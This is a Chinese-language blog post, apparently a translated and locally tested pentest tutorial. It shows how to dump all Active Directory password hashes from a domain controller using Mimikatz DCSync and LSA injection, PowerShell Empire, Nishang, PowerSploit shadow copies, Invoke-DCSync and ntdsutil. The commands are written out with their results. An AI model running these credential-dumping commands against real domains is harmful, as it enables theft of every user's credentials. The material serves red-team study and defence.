@@ -1,0 +1,1096 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="如何Dump域内的Hash原文地址：https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/ps:上一篇提权那篇译文，backlion说有实际操作就更好了，所以这篇我尽量都在自己DC上测试一遍，不当之处请指教。在渗透测试的过程中，当我们已经是域管权限时，就可以实现提取所有域内用户的密码哈希以进行离线破解和分析，这是非常常见">
+<meta name="keywords" content="域渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Dumping Domain Password Hashes">
+<meta property="og:url" content="https://wh0ale.github.io/2019/12/30/Dumping-Domain-Password-Hashes/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="如何Dump域内的Hash原文地址：https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/ps:上一篇提权那篇译文，backlion说有实际操作就更好了，所以这篇我尽量都在自己DC上测试一遍，不当之处请指教。在渗透测试的过程中，当我们已经是域管权限时，就可以实现提取所有域内用户的密码哈希以进行离线破解和分析，这是非常常见">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171010-5a8263e4-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171010-5aa98f46-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171010-5ae7e4f8-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171011-5b53a3d2-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171012-5bb7b16a-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171012-5becc0c6-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171012-5c0f6fa4-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171012-5c350214-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171013-5c7b79a6-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171013-5cc1f034-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171014-5cdb23ba-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171014-5cec702a-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171014-5cfa4164-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171014-5d0baaf8-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171014-5d3a589e-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171014-5d49afd8-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171014-5d5d9386-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171015-5d6f7c86-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171015-5da943b2-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171015-5dcbbd8e-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171015-5de7ab8e-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171015-5dff596e-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e1c9470-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e2dbe6c-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e41a936-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e4d0146-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e59d402-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e659fd0-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e6f6b00-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e7be114-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e876886-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e94e646-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171017-5ea8bfb8-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171017-5eb5e030-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171017-5eda5186-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171017-5f0213c4-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171017-5f1d30b4-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171017-5f307fd4-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171018-5f3d4c6e-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171018-5f58d240-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171018-5f7b4348-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171018-5f982364-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171018-5fbcbeea-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171019-5fe2dac6-988f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171019-60097d02-988f-1.png">
+<meta property="og:updated_time" content="2019-12-30T11:51:48.110Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Dumping Domain Password Hashes">
+<meta name="twitter:description" content="如何Dump域内的Hash原文地址：https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/ps:上一篇提权那篇译文，backlion说有实际操作就更好了，所以这篇我尽量都在自己DC上测试一遍，不当之处请指教。在渗透测试的过程中，当我们已经是域管权限时，就可以实现提取所有域内用户的密码哈希以进行离线破解和分析，这是非常常见">
+<meta name="twitter:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180805171010-5a8263e4-988f-1.png">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2019/12/30/Dumping-Domain-Password-Hashes/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Dumping Domain Password Hashes | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2019/12/30/Dumping-Domain-Password-Hashes/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">Dumping Domain Password Hashes
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-12-30 19:41:07 / 修改时间：19:51:48" itemprop="dateCreated datePublished" datetime="2019-12-30T19:41:07+08:00">2019-12-30</time>
+            </span>
+          
+            
+
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/红队/" itemprop="url" rel="index"><span itemprop="name">红队</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">7.2k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">7 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <h1 id="如何Dump域内的Hash"><a href="#如何Dump域内的Hash" class="headerlink" title="如何Dump域内的Hash"></a>如何Dump域内的Hash</h1><p>原文地址：<a href="https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/" target="_blank" rel="noopener">https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/</a><br>ps:上一篇提权那篇译文，backlion说有实际操作就更好了，所以这篇我尽量都在自己DC上测试一遍，不当之处请指教。<br>在渗透测试的过程中，当我们已经是域管权限时，就可以实现提取所有域内用户的密码哈希以进行离线破解和分析，这是非常常见的一个操作。这些哈希值存储在域控制器（NTDS.DIT​​）中的数据库文件中，并带有一些其他信息，如组中成员身份和用户。</p>
+<p><code>NTDS.DIT</code>文件经常被操作系统使用，因此无法直接复制到其他位置以提取信息。可以在Windows以下位置找到此文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\NTDS\NTDS.dit</span><br></pre></td></tr></table></figure>
+
+<p>ps:这是我自己域控中的实例<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171010-5a8263e4-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171010-5a8263e4-988f-1.png" alt="img"></a></p>
+<p>可以使用各种骚操作来提取此文件或存储在其中的信息，但是大多数情况下都使用以下方法之一：</p>
+<ul>
+<li>域控复制服务</li>
+<li>原生Windows二进制文件</li>
+<li>WMI</li>
+</ul>
+<h2 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h2><p>Mimikatz有一个功能（dcsync），它利用目录复制服务（DRS）从NTDS.DIT文件中检索密码哈希值。这样子解决了需要直接使用域控制器进行身份验证的需要，因为它可以从域管理员的上下文中获得执行权限。因此它是红队的基本操作，因为它不那么复杂。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:pentestlab.local /all /csv</span><br></pre></td></tr></table></figure>
+
+<p>ps：这是我在我本地DC中实际测试的图<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171010-5aa98f46-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171010-5aa98f46-988f-1.png" alt="img"></a></p>
+<blockquote>
+<p>ps:<a href="https://msdn.microsoft.com/zh-cn/library/cc239691.aspx" target="_blank" rel="noopener">目录复制服务远程协议解释</a>:目录复制服务远程协议是用于DC之间复制和AD管理的RPC协议。该协议由一个名为drsuapi的 RPC接口组成。<br>对于客户端与AD轻型目录服务（AD/LDS）域控制器建立RPC连接，它需要知道计算机的名称以及AD/LDS域控制器正在侦听的LDAP端口的编号。首先，客户端建立与计算机上的端点映射器服务的连接。<br>接下来，客户端枚举为所需接口ID注册的所有端点。最后，客户端选择其注释等于所需AD/LDS域控制器的LDAP端口号的端点。<br>此协议适用于管理目录中的对象，以及目录服务的整体管理。</p>
+</blockquote>
+<p>通过使用<code>/user</code>参数指定域用户名，<code>Mimikatz</code>可以dump此特定用户的所有帐户信息，包括其密码哈希。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:pentestlab.local /user:test</span><br></pre></td></tr></table></figure>
+
+<p>wing&#39;s DC<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171010-5ae7e4f8-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171010-5ae7e4f8-988f-1.png" alt="img"></a><br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171011-5b53a3d2-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171011-5b53a3d2-988f-1.png" alt="img"></a></p>
+<p>或者直接在域控制器中执行Mimikatz，通过lsass.exe进程dump哈希。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::lsa /inject</span><br></pre></td></tr></table></figure>
+
+<p>将检索域内用户的密码哈希值。</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171012-5bb7b16a-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171012-5bb7b16a-988f-1.png" alt="img"></a></p>
+<h2 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h2><p><code>PowerShell Empire</code>有两个模块，可以通过<code>DCSync</code>攻击dump域内哈希值。这两个模块都需要以域管理员权限执行，并且目标机器正在使用Microsoft复制服务。这些模块依赖于<code>Invoke-Mimikatz PowerShell</code>脚本来执行与<code>DCSync</code>相关的<code>Mimikatz</code>命令。以下模块将域内哈希值提取为类似于<code>Metasploit hashdump</code>命令输出的格式。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule credentials/mimikatz/dcsync_hashdump</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171012-5becc0c6-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171012-5becc0c6-988f-1.png" alt="img"></a><br>用<code>DCSync</code>模块dump所有的帐户中指定的用户信息。<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171012-5c0f6fa4-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171012-5c0f6fa4-988f-1.png" alt="img"></a><br>将获得以下信息：<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171012-5c350214-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171012-5c350214-988f-1.png" alt="img"></a></p>
+<h2 id="Nishang"><a href="#Nishang" class="headerlink" title="Nishang"></a>Nishang</h2><p><a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">Nishang</a>是一个<code>PowerShell</code>框架，它让<code>redteam</code>和渗透测试人员能够对系统进行攻击性操作。Nishang中的<a href="https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1" target="_blank" rel="noopener">VSS脚本</a>可以用于自动提取所需的文件：<code>NTDS.DIT，SAM和SYSTEM</code>。这些文件将被解压缩到当前工作目录或指定的任何其他文件夹中。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Copy-VSS.ps1</span><br><span class="line">Copy-VSS</span><br><span class="line">Copy-VSS -DestinationDir C:\ShadowCopy\</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171013-5c7b79a6-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171013-5c7b79a6-988f-1.png" alt="img"></a><br>我操作完之后当前文件夹已经dump了。</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171013-5cc1f034-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171013-5cc1f034-988f-1.png" alt="img"></a></p>
+<p>或者，可以通过现有的Meterpreter会话加载PowerShell扩展来执行脚本。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">load powershell</span><br><span class="line">powershell_import /root/Copy-VSS.ps1</span><br><span class="line">powershell_execute Copy-VSS</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171014-5cdb23ba-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171014-5cdb23ba-988f-1.png" alt="img"></a></p>
+<p>也可以使用命令<code>powershell_shell</code>直接建立PowerShell会话，以便在在现有的Meterpreter会话中导入脚本后提取文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Copy-VSS</span><br><span class="line">Copy-VSS -DestinationDir C:\Ninja</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171014-5cec702a-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171014-5cec702a-988f-1.png" alt="img"></a></p>
+<h2 id="PowerSploit"><a href="#PowerSploit" class="headerlink" title="PowerSploit"></a>PowerSploit</h2><p><a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">PowerSploit</a>包含PowerShell脚本，该脚本利用卷复制服务创建可用于提取文件的新卷。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\VolumeShadowCopyTools.ps1</span><br><span class="line">New-VolumeShadowCopy -Volume C:\</span><br><span class="line">Get-VolumeShadowCopy</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171014-5cfa4164-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171014-5cfa4164-988f-1.png" alt="img"></a><br>或者，可以通过加载PowerShell扩展来从现有的Meterpreter会话执行它。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell_shell</span><br><span class="line">New-VolumeShadowCopy -Volume C:\</span><br><span class="line">Get-VOlumeShadowCopy</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171014-5d0baaf8-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171014-5d0baaf8-988f-1.png" alt="img"></a><br>然后，可以使用copy命令将文件从新卷复制到目标路径。</p>
+<h2 id="Invoke-DCSync"><a href="#Invoke-DCSync" class="headerlink" title="Invoke-DCSync"></a>Invoke-DCSync</h2><p><a href="https://xz.aliyun.com/tmp/VMwareDnD/681cf04a/Invoke-DCSync.ps1" target="_blank" rel="noopener">Invoke–DCSync</a> 是Nick Landers利用PowerView开发的powershell脚本。<br>Invoke-ReflectivePEInjection和PowerKatz的DLL wrapper 调用Mimikatz的DCSync方法检索哈希值。<br>直接执行该函数将生成以下输出：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-DCSync</span><br></pre></td></tr></table></figure>
+
+<p>优秀，哈哈！<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171014-5d3a589e-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171014-5d3a589e-988f-1.png" alt="img"></a></p>
+<p>结果将格式化为四个表：Domain，User，RID和Hash。但是，使用参数-PWDumpFormat执行Invoke-DCSync将以以下格式检索哈希：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user：id：lm：ntlm :::</span><br><span class="line">Invoke-DCSync -PWDumpFormat</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171014-5d49afd8-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171014-5d49afd8-988f-1.png" alt="img"></a><br>通过从现有的Meterpreter会话运行脚本，可以实现相同的输出。</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171014-5d5d9386-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171014-5d5d9386-988f-1.png" alt="img"></a><br>使用PWDumpFormat：<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171015-5d6f7c86-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171015-5d6f7c86-988f-1.png" alt="img"></a></p>
+<h2 id="NTDSUTIL"><a href="#NTDSUTIL" class="headerlink" title="NTDSUTIL"></a>NTDSUTIL</h2><p>该NTDSUTIL是一个命令行工具，它是域控制器生态系统的一部分，其目的是为了使管理员能够访问和管理<code>Windows Active Directory</code>数据库。但是，渗透测试人员和redteam可以用它来拍摄现有ntds.dit文件的快照，该文件可以复制到新位置以进行离线分析和密码哈希的提取。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil</span><br><span class="line">activate instance ntds</span><br><span class="line">ifm</span><br><span class="line">create full C:\ntdsutil</span><br><span class="line">quit</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171015-5da943b2-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171015-5da943b2-988f-1.png" alt="img"></a><br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171015-5dcbbd8e-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171015-5dcbbd8e-988f-1.png" alt="img"></a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将生成两个新文件夹：Active Directory和Registry。NTDS.DIT文件将保存在Active Directory中，SAM和SYSTEM文件将保存到Registry文件夹中。</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180805171015-5de7ab8e-988f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180805171015-5de7ab8e-988f-1.png" alt="img"></a></p>
